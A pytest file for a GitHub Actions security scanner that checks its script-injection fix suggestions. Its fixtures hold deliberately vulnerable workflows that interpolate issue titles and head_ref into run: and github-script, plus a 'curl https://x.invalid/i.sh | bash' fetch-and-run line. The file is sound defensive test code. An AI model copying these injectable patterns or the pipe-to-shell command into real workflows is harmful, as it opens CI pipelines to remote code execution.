"""Auto-fix sugerido para script-injection (roadmap: env indirection).

Cada achado de `script-injection` passa a carregar uma sugestão CONCRETA de correção
(mover a expressão para um bloco `env:` e referenciá-la com `"$VAR"` no `run:` — ou
`process.env.VAR` no `github-script`). É enriquecimento do achado: a ferramenta não
reescreve o YAML, só sugere. Só `script-injection` recebe a sugestão; as demais checagens
continuam com `fix_suggestion is None`.
"""

from __future__ import annotations

import json
import textwrap
from pathlib import Path

from esteira.checks.engine import scan
from esteira.core.models import Finding, ScanResult
from esteira.report.json_report import to_json
from esteira.report.sarif import to_sarif


def _scan_text(tmp_path: Path, text: str, name: str = "w.yml") -> ScanResult:
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    (wf_dir / name).write_text(text, encoding="utf-8")
    return scan(tmp_path)


def _injections(result: ScanResult) -> list[Finding]:
    return [f for f in result.findings if f.check_id == "script-injection"]


_RUN_INJECTION = textwrap.dedent("""\
    on: issues
    permissions: {}
    jobs:
      b:
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ github.event.issue.title }}"
""")


# --------------------------------------------------------------------------- #
# positivo: o achado carrega uma sugestão concreta e acionável
# --------------------------------------------------------------------------- #


def test_run_injection_carries_concrete_env_fix(tmp_path: Path) -> None:
    found = _injections(_scan_text(tmp_path, _RUN_INJECTION))
    assert len(found) == 1
    suggestion = found[0].fix_suggestion
    assert suggestion is not None
    # move para env: e referencia a variável com aspas no run: — os dois lados da correção.
    assert "env:" in suggestion
    assert "${{ github.event.issue.title }}" in suggestion  # a expressão exata a mover
    assert '"$TITLE"' in suggestion  # nome derivado do último segmento do contexto


def test_env_var_name_derives_from_context_tail(tmp_path: Path) -> None:
    wf = textwrap.dedent("""\
        on: pull_request_target
        permissions: {}
        jobs:
          b:
            runs-on: ubuntu-latest
            steps:
              - run: echo "${{ github.head_ref }}"
    """)
    found = _injections(_scan_text(tmp_path, wf))
    assert found and found[0].fix_suggestion is not None
    assert '"$HEAD_REF"' in found[0].fix_suggestion


def test_github_script_injection_suggests_process_env_not_shell(tmp_path: Path) -> None:
    # No sink JS a correção é process.env — sugerir "$VAR" de shell seria conselho errado.
    wf = textwrap.dedent("""\
        on: issues
        permissions: {}
        jobs:
          triage:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/github-script@v7
                with:
                  script: |
                    const t = "${{ github.event.issue.title }}";
    """)
    found = _injections(_scan_text(tmp_path, wf))
    assert found and found[0].fix_suggestion is not None
    suggestion = found[0].fix_suggestion
    assert "process.env.TITLE" in suggestion
    assert "run:" not in suggestion  # não recomenda o padrão de shell num script JS


def test_suggestion_surfaces_in_json_report(tmp_path: Path) -> None:
    doc = json.loads(to_json(_scan_text(tmp_path, _RUN_INJECTION)))
    inj = [f for f in doc["findings"] if f["check"] == "script-injection"]
    assert inj and inj[0]["fix_suggestion"] is not None
    assert "env:" in inj[0]["fix_suggestion"]


def test_suggestion_surfaces_in_sarif_message(tmp_path: Path) -> None:
    doc = json.loads(to_sarif(_scan_text(tmp_path, _RUN_INJECTION)))
    results = doc["runs"][0]["results"]
    inj = [r for r in results if r["ruleId"] == "script-injection"]
    assert inj and "env indirection" in inj[0]["message"]["text"]


# --------------------------------------------------------------------------- #
# negativo: a sugestão é EXCLUSIVA de script-injection; nada mais a carrega
# --------------------------------------------------------------------------- #


def test_non_injection_finding_has_no_fix_suggestion(tmp_path: Path) -> None:
    wf = textwrap.dedent("""\
        on: push
        permissions: {}
        jobs:
          b:
            runs-on: ubuntu-latest
            steps:
              - run: curl https://x.invalid/i.sh | bash
    """)
    result = _scan_text(tmp_path, wf)
    curl = [f for f in result.findings if f.check_id == "curl-pipe-shell"]
    assert curl and all(f.fix_suggestion is None for f in curl)
    assert not _injections(result)  # e não gerou script-injection espúrio


def test_only_script_injection_carries_suggestion_in_mixed_repo(vuln_repo: Path) -> None:
    findings = scan(vuln_repo).findings
    with_suggestion = {f.check_id for f in findings if f.fix_suggestion is not None}
    assert with_suggestion == {"script-injection"}
    # e todo achado de script-injection realmente tem a sugestão (nenhum None esquecido).
    assert all(f.fix_suggestion for f in findings if f.check_id == "script-injection")
